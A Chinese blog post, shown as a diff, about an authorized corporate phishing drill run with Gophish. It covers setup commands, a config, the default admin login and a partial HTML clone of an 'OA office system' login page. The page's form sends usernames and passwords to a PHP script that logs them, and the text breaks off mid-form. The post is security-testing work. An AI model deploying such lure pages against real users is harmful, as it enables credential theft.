@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="钓鱼演练已经是上个月的事了，客户是某国企客户，因为当时身兼多个项目，没能有精力实时记录，过了一个月，感觉如果不记录下来，这对我来说是一个极大的损失，还是补一次博客吧，以记录我这来之不易的实战机会。 gophish安装Gophish是一个功能强大的开源网络钓鱼框架，可以轻松测试组织的网络钓鱼风险，专为企业和渗透测试人员设计。我们可以通过该框架快速生成邮件钓鱼模板并开展钓鱼行动，同时还能在后台查看到邮">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次使用gophish开展的钓鱼演练">
+<meta property="og:url" content="http://example.com/2025/10/21/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gophish%E5%BC%80%E5%B1%95%E7%9A%84%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="钓鱼演练已经是上个月的事了，客户是某国企客户，因为当时身兼多个项目，没能有精力实时记录，过了一个月，感觉如果不记录下来，这对我来说是一个极大的损失，还是补一次博客吧，以记录我这来之不易的实战机会。 gophish安装Gophish是一个功能强大的开源网络钓鱼框架，可以轻松测试组织的网络钓鱼风险，专为企业和渗透测试人员设计。我们可以通过该框架快速生成邮件钓鱼模板并开展钓鱼行动，同时还能在后台查看到邮">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/50bd9679-682e-460f-94b8-0e18fb079f3d.png">
+<meta property="og:image" content="http://example.com/images/b4e4e54f-b668-4391-9020-4ea1a1aef4d4.png">
+<meta property="og:image" content="http://example.com/images/01550166-c589-4907-8e94-1a65dbe86bd2.png">
+<meta property="og:image" content="http://example.com/images/a81d4d00-5a73-446c-989c-3eb91292f0ef.png">
+<meta property="og:image" content="http://example.com/images/e110e76f-d302-4b6a-bfee-7ee738d9f2df.png">
+<meta property="og:image" content="http://example.com/images/8b89f40caf4098e0af6e0ebc2c5a5872.png">
+<meta property="og:image" content="http://example.com/images/14659717ed10bb080c0dd3751a5233a9.png">
+<meta property="og:image" content="http://example.com/images/3b7ad5c5c03df5ae1d2ec4cc60db9b09.png">
+<meta property="og:image" content="http://example.com/images/7e30eda66be1e0d03d16b2feb99aa74e.png">
+<meta property="og:image" content="http://example.com/images/eb0881bf-fc5c-4d1a-877d-cd59642c93c8.png">
+<meta property="og:image" content="http://example.com/images/4c7fe845db8f6b398c29c2f7bb103b8f.png">
+<meta property="og:image" content="http://example.com/images/c0622b8e6c30d9c45441361404f89b8b.png">
+<meta property="og:image" content="http://example.com/images/9dd1f2d56eba033d0696eb65318798b2.png">
+<meta property="og:image" content="http://example.com/images/91cac3da28e053cdaad42057593d7cae.png">
+<meta property="og:image" content="http://example.com/images/35a10a02d84f53e14d7dcfc4122ddcef.png">
+<meta property="og:image" content="http://example.com/images/128404802efd464f7f194a8bb573e3b7.png">
+<meta property="og:image" content="http://example.com/images/96536ea072589880b3322895f526c086.png">
+<meta property="og:image" content="http://example.com/images/aaafbe25342518c19a867374dc8dd115.png">
+<meta property="og:image" content="http://example.com/images/f8e171f0c45a7fc56a40c6dc3a4388ba.png">
+<meta property="og:image" content="http://example.com/images/e49f9ab6fac3d7f86af1a31240173538.png">
+<meta property="og:image" content="http://example.com/images/10e3493ba5daebe5644ccb71f8f35eb6.png">
+<meta property="og:image" content="http://example.com/images/199846fe8119a4db00ce065ad7984805.png">
+<meta property="og:image" content="http://example.com/images/f8d40c0ef386eaddec620ce01540986f.png">
+<meta property="og:image" content="http://example.com/images/88dfa1208c820576abe8e24032aacad7.png">
+<meta property="og:image" content="http://example.com/images/3adc61aa35f966d5b5bd7d2beb7399b1.png">
+<meta property="og:image" content="http://example.com/images/5eb2aa864427e45fa765a24ffa8763e4.png">
+<meta property="og:image" content="http://example.com/images/04451582dc8a598cd263daca01ae5a77.png">
+<meta property="og:image" content="http://example.com/images/03c9cc03a75541bb0599d4366f68deef.png">
+<meta property="og:image" content="http://example.com/images/20251021013357.jpg">
+<meta property="og:image" content="http://example.com/images/b829afad15cf88dfdbdb5c799f683277.png">
+<meta property="article:published_time" content="2025-10-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-20T17:50:18.340Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/50bd9679-682e-460f-94b8-0e18fb079f3d.png">
+  
+  
+  
+  <title>记一次使用gophish开展的钓鱼演练 - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="记一次使用gophish开展的钓鱼演练"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-21 00:00" pubdate>
+          2025年10月21日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          140 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">记一次使用gophish开展的钓鱼演练</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>钓鱼演练已经是上个月的事了，客户是某国企客户，因为当时身兼多个项目，没能有精力实时记录，过了一个月，感觉如果不记录下来，这对我来说是一个极大的损失，还是补一次博客吧，以记录我这来之不易的实战机会。</p>
+<h2 id="gophish安装"><a href="#gophish安装" class="headerlink" title="gophish安装"></a>gophish安装</h2><p>Gophish是一个功能强大的开源网络钓鱼框架，可以轻松测试组织的网络钓鱼风险，专为企业和渗透测试人员设计。我们可以通过该框架快速生成邮件钓鱼模板并开展钓鱼行动，同时还能在后台查看到邮件的一个收发情况。</p>
+<p><a target="_blank" rel="noopener" href="https://geekdaxue.co/read/xuea-man@ybcd4h/9ba3f2cc-b0be-4ba1-a93c-a6edc7ccc64b">搭建教程</a></p>
+<p>Gophish 项目地址：<a target="_blank" rel="noopener" href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a><br>Gophish 官网地址：<a target="_blank" rel="noopener" href="https://getgophish.com/">https://getgophish.com/</a></p>
+<p>gophish 自带 web 面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷<br>在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用</p>
+<p>安装包下载：<a target="_blank" rel="noopener" href="https://github.com/gophish/gophish/releases">https://github.com/gophish/gophish/releases</a></p>
+<p>gophish 可以运行在常见的操作系统上,这里我们是搭建在ubuntu上</p>
+<p><strong>使用wget命令下载到本地</strong><br>下面非最新版本</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-number">32</span>bit<br>root@ubuntu:~$ wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gophish/g</span>ophish<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v0.10.1/g</span>ophish-v0.<span class="hljs-number">10.1</span>-linux-<span class="hljs-number">32</span>bit.zip<br><span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit<br>root@ubuntu:~$ wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gophish/g</span>ophish<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v0.10.1/g</span>ophish-v0.<span class="hljs-number">10.1</span>-linux-<span class="hljs-number">64</span>bit.zip<br></code></pre></td></tr></table></figure>
+<p>下载完成后，利用unzip命令进行解压</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>mkdir gophish<br>root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>unzip gophish-v0.<span class="hljs-number">10.1</span>-linux<span class="hljs-number">-64</span>bit.zip -d ./gophish<br></code></pre></td></tr></table></figure>
+<p><strong>修改配置文件：</strong></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd gophish<br></code></pre></td></tr></table></figure>
+<p>若需要远程访问后台管理界面，将listen_url修改为0.0.0.0:3333，端口可自定义。（这项主要针对于部署在服务器上，因为一般的 Linux 服务器都不会安装可视化桌面，因此需要本地远程访问部署在服务器上的 gophish 后台）<br>如果仅通过本地访问，保持127.0.0.1:3333即可<br>这里改为0.0.0.0，因为是挂载在云服务器上的</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>vi config.json<br>&#123;<br>        <span class="hljs-regexp">//</span>后台管理配置<br>        <span class="hljs-string">&quot;admin_server&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;listen_url&quot;</span>: <span class="hljs-string">&quot;0.0.0.0:3333&quot;</span>,  <span class="hljs-regexp">//</span> 远程访问后台管理<br>                <span class="hljs-string">&quot;use_tls&quot;</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&quot;cert_path&quot;</span>: <span class="hljs-string">&quot;gophish_admin.crt&quot;</span>,<br>                <span class="hljs-string">&quot;key_path&quot;</span>: <span class="hljs-string">&quot;gophish_admin.key&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;phish_server&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;listen_url&quot;</span>: <span class="hljs-string">&quot;0.0.0.0:80&quot;</span>,<br>                <span class="hljs-string">&quot;use_tls&quot;</span>: <span class="hljs-literal">false</span>,<br>                <span class="hljs-string">&quot;cert_path&quot;</span>: <span class="hljs-string">&quot;example.crt&quot;</span>,<br>                <span class="hljs-string">&quot;key_path&quot;</span>: <span class="hljs-string">&quot;example.key&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;db_name&quot;</span>: <span class="hljs-string">&quot;sqlite3&quot;</span>,<br>        <span class="hljs-string">&quot;db_path&quot;</span>: <span class="hljs-string">&quot;gophish.db&quot;</span>,<br>        <span class="hljs-string">&quot;migrations_prefix&quot;</span>: <span class="hljs-string">&quot;db/db_&quot;</span>,<br>        <span class="hljs-string">&quot;contact_address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;logging&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;filename&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                <span class="hljs-string">&quot;level&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>运行 gophish：</strong><br>运行 gophish 脚本</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>./gophish<br></code></pre></td></tr></table></figure>
+
+<p><strong>访问后台管理系统：</strong></p>
+<p>本地打开浏览器，访问<a target="_blank" rel="noopener" href="https://ip:3333/">https://ip:3333/</a> （注意使用 https 协议）<br>可能会提示证书不正确，依次点击 高级 — 继续转到页面 ，输入默认账密进行登录：admin&#x2F;gophish</p>
+<p>部署在公网服务器上，登录后在功能面板Account Settings处修改高强度密码</p>
+<p><img src="/images/50bd9679-682e-460f-94b8-0e18fb079f3d.png" srcset="/img/loading.gif" lazyload></p>
+<p>当仅仅使用命令.&#x2F;gophish来启动 gophish 时，经过一段时间会自动掉线（脚本终止运行）<br>所以需要长期保持运行时，可以结合nohup与&amp;来启动 gophish，保持后台稳定运行</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>nohup ./gophish &amp;<br></code></pre></td></tr></table></figure>
+
+<h2 id="钓鱼页面制作"><a href="#钓鱼页面制作" class="headerlink" title="钓鱼页面制作"></a>钓鱼页面制作</h2><p>钓鱼页面制作我没有用gophish中的钓鱼页面制作，我是使用ai制作的钓鱼页面<br>构成为一个前端页面index.html+login.php处理表单+发送至account.txt的形式<br>登录页面(有点粗糙哈哈，因为客户要求不能太像他们的OA系统，而且不能太精细呃呃呃呃，所以这个前端页面已经是改过的第三版)<br><img src="/images/b4e4e54f-b668-4391-9020-4ea1a1aef4d4.png" srcset="/img/loading.gif" lazyload><br>输入表单内容<br><img src="/images/01550166-c589-4907-8e94-1a65dbe86bd2.png" srcset="/img/loading.gif" lazyload><br>ok到这里钓鱼就成功了，没有太多花里胡哨，其实本来应该可以很精彩的，但客户就是客户哈哈<br><img src="/images/a81d4d00-5a73-446c-989c-3eb91292f0ef.png" srcset="/img/loading.gif" lazyload><br>成功保存表单输入的信息，时间+ip信息+用户+密码 这里ip显示是因为本地起的<br>index.hhml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>OA综合办公系统<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        tailwind.<span class="hljs-property">config</span> = &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">theme</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">extend</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">colors</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">primary</span>: <span class="hljs-string">&#x27;#165DFF&#x27;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">secondary</span>: <span class="hljs-string">&#x27;#0F3C91&#x27;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">neutral</span>: <span class="hljs-string">&#x27;#F5F7FA&#x27;</span>,</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    <span class="hljs-attr">fontFamily</span>: &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">sans</span>: [<span class="hljs-string">&#x27;Inter&#x27;</span>, <span class="hljs-string">&#x27;system-ui&#x27;</span>, <span class="hljs-string">&#x27;sans-serif&#x27;</span>],</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/tailwindcss&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-keyword">@layer</span> utilities &#123;</span><br><span class="language-css">            <span class="hljs-selector-class">.bg-gradient-weaver</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#1E88E5</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#1565C0</span> <span class="hljs-number">50%</span>, <span class="hljs-number">#0D47A1</span> <span class="hljs-number">100%</span>);</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-class">.text-shadow</span> &#123;</span><br><span class="language-css">                <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);</span><br><span class="language-css">            &#125;</span><br><span class="language-css">            <span class="hljs-selector-class">.input-focus</span> &#123;</span><br><span class="language-css">                <span class="hljs-keyword">@apply</span> <span class="hljs-attribute">focus</span>:border-primary <span class="hljs-attribute">focus</span>:ring-<span class="hljs-number">2</span> <span class="hljs-attribute">focus</span>:ring-primary/<span class="hljs-number">20</span> <span class="hljs-attribute">focus</span>:outline-none;</span><br><span class="language-css">            &#125;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;bg-gradient-weaver min-h-screen flex flex-col items-center justify-center p-4&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mb-12&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-[clamp(1.8rem,4vw,2.5rem)] font-bold text-white text-shadow&quot;</span>&gt;</span>OA综合办公系统<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-full max-w-md bg-white/10 backdrop-blur-md rounded-lg shadow-xl p-8 border border-white/20&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginForm&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;space-y-6&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;relative&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-user 